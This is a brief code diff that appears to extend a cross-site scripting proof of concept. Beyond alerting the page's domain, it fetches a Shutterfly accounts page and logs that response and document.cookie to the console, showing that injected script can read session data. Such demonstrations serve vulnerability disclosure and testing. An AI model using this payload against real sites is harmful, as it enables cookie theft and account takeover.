@@ -1,1 +1,4 @@
 alert(document.domain);
+response = await fetch("https://accounts.shutterfly.com/cookies.html");
+console.log(response.text())
+console.log(document.cookie)
